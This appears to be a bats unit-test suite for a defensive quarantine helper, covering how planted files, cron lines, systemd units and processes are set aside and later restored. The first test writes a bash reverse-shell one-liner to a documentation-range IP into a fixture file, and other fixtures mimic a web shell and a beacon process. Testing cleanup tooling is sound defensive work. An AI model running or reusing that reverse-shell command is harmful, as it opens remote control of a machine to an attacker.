#!/usr/bin/env bats
# Unit tests for the quarantine helper (core/quarantine/quarantine.sh,
# design 17, section 5.1). Items live under a fake root in the test's own
# folder; systemctl is a stub that writes its arguments to $CALLS.

setup() {
  LAB_ROOT="$(cd "$BATS_TEST_DIRNAME/../.." && pwd)"
  export LAB_ROOT
  export LAB_SYSROOT="$BATS_TEST_TMPDIR/root"
  export LAB_CONFIG_DIR="$BATS_TEST_TMPDIR/etc"
  export LAB_STATE_DIR="$BATS_TEST_TMPDIR/state"
  export LAB_LOG_DIR="$BATS_TEST_TMPDIR/logs"
  export LAB_BACKUP_DIR="$BATS_TEST_TMPDIR/backup"
  export LAB_RUN_ID='20261005T120000Z-abcd'
  export LAB_MODULE_ID='lockout.persistence'
  export LAB_DRY_RUN=0
  export CALLS="$BATS_TEST_TMPDIR/calls"
  R="$LAB_SYSROOT"
  mkdir -p "$R/etc/cron.d" "$R/tmp" "$LAB_CONFIG_DIR" "$BATS_TEST_TMPDIR/bin"
  : > "$CALLS"
  PATH="$BATS_TEST_TMPDIR/bin:$PATH"
  # shellcheck source=/dev/null
  source "$LAB_ROOT/core/lib.sh"
}

stub() {
  printf '#!/usr/bin/env bash\necho "%s $*" >> "$CALLS"\n%s\n' "$1" "$2" > "$BATS_TEST_TMPDIR/bin/$1"
  chmod +x "$BATS_TEST_TMPDIR/bin/$1"
}

called() { grep -qxF -- "$1" "$CALLS"; }
# A bare "! cmd" never fails a bats test, so the negative checks are functions.
never_ran() { ! grep -q -- "$1" "$CALLS"; }
absent() { [ ! -e "$1" ] && [ ! -L "$1" ]; }
entries() { grep -c "\"action\":\"$1\"" "$(lab_manifest_file)" 2> /dev/null || true; }
manifest_field() { lab_json_get "$(grep "\"action\":\"$1\"" "$(lab_manifest_file)" | head -n 1)" "$2"; }

@test "file: moved aside with its owner, mode and hash, and restored byte for byte" {
  printf '#!/bin/sh\nbash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n' > "$R/tmp/.x"
  chmod 750 "$R/tmp/.x"
  local sum
  sum="$(sha256sum "$R/tmp/.x")"
  lab_quarantine_file "$R/tmp/.x" 'reverse shell from /tmp'
  absent "$R/tmp/.x"
  local dest
  dest="$(manifest_field quarantine_file backup)"
  [ "$dest" = "$LAB_BACKUP_DIR/quarantine/$LAB_RUN_ID/1$R/tmp/.x" ]
  [ -f "$dest" ]
  [[ "$(manifest_field quarantine_file prev)" == *" 750 ${sum%% *}" ]]
  [ "$(manifest_field quarantine_file note)" = 'reverse shell from /tmp' ]
  lab_quarantine_restore
  [ "$(sha256sum "$R/tmp/.x")" = "$sum" ]
  [ "$(stat -c %a "$R/tmp/.x")" = 750 ]
  absent "$dest"
  lab_quarantine_restore
  [ "$(sha256sum "$R/tmp/.x")" = "$sum" ]
}

@test "file: a symbolic link is moved, not followed" {
  printf 'keep\n' > "$R/etc/target"
  ln -s "$R/etc/target" "$R/etc/link"
  lab_quarantine_file "$R/etc/link" 'planted link'
  absent "$R/etc/link"
  [ "$(cat "$R/etc/target")" = keep ]
  [[ "$(manifest_field quarantine_file prev)" == *" link $R/etc/target" ]]
  lab_quarantine_restore
  [ -L "$R/etc/link" ]
  [ "$(readlink "$R/etc/link")" = "$R/etc/target" ]
}

@test "file: refused in plan mode, for a folder, a relative path or Labyrinth's own tree" {
  printf 'x\n' > "$R/tmp/a"
  mkdir -p "$LAB_STATE_DIR" "$R/tmp/dir"
  printf 'x\n' > "$LAB_STATE_DIR/s"
  local p
  for p in "$R/tmp/dir" tmp/a "$R/tmp/../tmp/a" "$LAB_STATE_DIR/s"; do
    run lab_quarantine_file "$p" test
    [ "$status" -eq 20 ] || { echo "$p: $status $output"; return 1; }
  done
  LAB_DRY_RUN=1 run lab_quarantine_file "$R/tmp/a" test
  [ "$status" -eq 20 ]
  [[ "$output" == *"refused in plan mode"* ]]
  [ -f "$R/tmp/a" ] && [ -f "$LAB_STATE_DIR/s" ]
  absent "$(lab_manifest_file)"
}

@test "file: an item already gone is nothing to do" {
  lab_quarantine_file "$R/tmp/gone" test
  absent "$(lab_manifest_file)"
}

@test "file: restore moves a newer file at the path aside, never over it" {
  printf 'planted\n' > "$R/tmp/x"
  lab_quarantine_file "$R/tmp/x" test
  printf 'replanted\n' > "$R/tmp/x"
  lab_quarantine_restore
  [ "$(cat "$R/tmp/x")" = planted ]
  [ "$(cat "$LAB_BACKUP_DIR/quarantine/$LAB_RUN_ID/aside-1$R/tmp/x")" = replanted ]
}

@test "file: a quarantined copy that changed is not put back" {
  printf 'planted\n' > "$R/tmp/x"
  lab_quarantine_file "$R/tmp/x" test
  printf 'tampered\n' > "$(manifest_field quarantine_file backup)"
  run lab_quarantine_restore
  [ "$status" -eq 40 ]
  [[ "$output" == *"has changed"* ]]
  absent "$R/tmp/x"
}

@test "file and cron: control characters in an item never stop its quarantine" {
  local name="$R/tmp/shell"$'\v'".php" line=$'*\t*\t*\t*\t*\troot\t/tmp/.x'
  printf 'x\n' > "$name"
  printf '%s\n' "$line" > "$R/etc/cron.d/tabs"
  lab_quarantine_file "$name" 'web shell'
  absent "$name"
  lab_quarantine_cron "$R/etc/cron.d/tabs" "$line" 'runs from /tmp'
  grep -qxF "# labyrinth-quarantine $LAB_RUN_ID-2: $line" "$R/etc/cron.d/tabs"
  [ "$(manifest_field quarantine_cron prev)" = "$line" ]
  lab_quarantine_restore
  [ -f "$name" ]
  [ "$(cat "$R/etc/cron.d/tabs")" = "$line" ]
}

@test "file: one that cannot be moved is left for a person (20), not an error" {
  [ "$(id -u)" -ne 0 ] || skip 'root can move a file out of a read-only folder'
  mkdir -p "$R/tmp/ro"
  printf 'x\n' > "$R/tmp/ro/f"
  chmod 555 "$R/tmp/ro"
  run lab_quarantine_file "$R/tmp/ro/f" test
  chmod 755 "$R/tmp/ro"
  [ "$status" -eq 20 ]
  [[ "$output" == *"list it for a person"* ]]
  [ -f "$R/tmp/ro/f" ]
  lab_quarantine_restore
  [ -f "$R/tmp/ro/f" ]
}

@test "cron: one line commented out with a marker, then uncommented in place" {
  local bad='* * * * * root /tmp/.x' good='0 3 * * * root /usr/bin/backup'
  printf 'SHELL=/bin/sh\n%s\n%s\n' "$good" "$bad" > "$R/etc/cron.d/jobs"
  lab_quarantine_cron "$R/etc/cron.d/jobs" "$bad" 'runs from /tmp'
  grep -qxF "# labyrinth-quarantine $LAB_RUN_ID-1: $bad" "$R/etc/cron.d/jobs"
  grep -qxF "$good" "$R/etc/cron.d/jobs"
  [ "$(manifest_field quarantine_cron prev)" = "$bad" ]
  lab_quarantine_cron "$R/etc/cron.d/jobs" "$bad" 'runs from /tmp'
  [ "$(entries quarantine_cron)" -eq 1 ]
  printf 'MAILTO=""\n' >> "$R/etc/cron.d/jobs"
  lab_quarantine_restore
  [ "$(cat "$R/etc/cron.d/jobs")" = "$(printf 'SHELL=/bin/sh\n%s\n%s\nMAILTO=""' "$good" "$bad")" ]
  lab_quarantine_restore
  grep -qxF "$bad" "$R/etc/cron.d/jobs"
}

@test "cron: a line that is not in the file is refused" {
  printf '0 3 * * * root /usr/bin/backup\n' > "$R/etc/cron.d/jobs"
  run lab_quarantine_cron "$R/etc/cron.d/jobs" '* * * * * root /tmp/.x' test
  [ "$status" -eq 20 ]
  absent "$(lab_manifest_file)"
}

@test "unit: disabled, stopped, its file quarantined, and brought back as it was" {
  mkdir -p "$R/etc/systemd/system"
  printf '[Service]\nExecStart=/tmp/.x\n' > "$R/etc/systemd/system/upd.service"
  stub systemctl "
case \"\$1 \$2\" in
  'show -p') [ \"\$3\" = FragmentPath ] && echo \"FragmentPath=$R/etc/systemd/system/upd.service\" ;;
  'is-enabled upd.service') echo enabled ;;
  'is-active upd.service') echo active ;;
esac
exit 0"
  lab_quarantine_unit upd.service 'runs from /tmp'
  called 'systemctl disable upd.service'
  called 'systemctl stop upd.service'
  called 'systemctl daemon-reload'
  absent "$R/etc/systemd/system/upd.service"
  [ "$(manifest_field quarantine_unit prev)" = 'enabled=enabled active=active' ]
  [ "$(entries quarantine_file)" -eq 1 ]
  : > "$CALLS"
  lab_quarantine_restore
  [ -f "$R/etc/systemd/system/upd.service" ]
  called 'systemctl enable upd.service'
  called 'systemctl start upd.service'
}

@test "unit: a package's unit file is never quarantined" {
  stub systemctl 'echo "FragmentPath=/usr/lib/systemd/system/ssh.service"'
  run lab_quarantine_unit ssh.service test
  [ "$status" -eq 20 ]
  [[ "$output" == *"not under /etc"* ]]
  never_ran 'disable'
  never_ran 'stop'
}

@test "process: ended and recorded; never process 1 or Labyrinth itself" {
  sleep 60 &
  local pid=$!
  lab_quarantine_process "$pid" 'started by a quarantined job'
  wait "$pid" 2> /dev/null || true
  [ ! -d "/proc/$pid" ]
  [[ "$(manifest_field quarantine_process prev)" == 'sleep 60'* ]]
  run lab_quarantine_process 1 test
  [ "$status" -eq 20 ]
  run lab_quarantine_process "$$" test
  [ "$status" -eq 20 ]
  run lab_quarantine_process 'x' test
  [ "$status" -eq 40 ]
}

@test "process: a control character in its arguments never stops it being ended" {
  bash -c 'exec -a "beacon"$'"'"'\001'"'"' sleep 60' &
  local pid=$!
  sleep 0.2
  lab_quarantine_process "$pid" 'beacon'
  wait "$pid" 2> /dev/null || true
  [ ! -d "/proc/$pid" ]
  [[ "$(manifest_field quarantine_process prev)" == beacon$'\001'* ]]
}
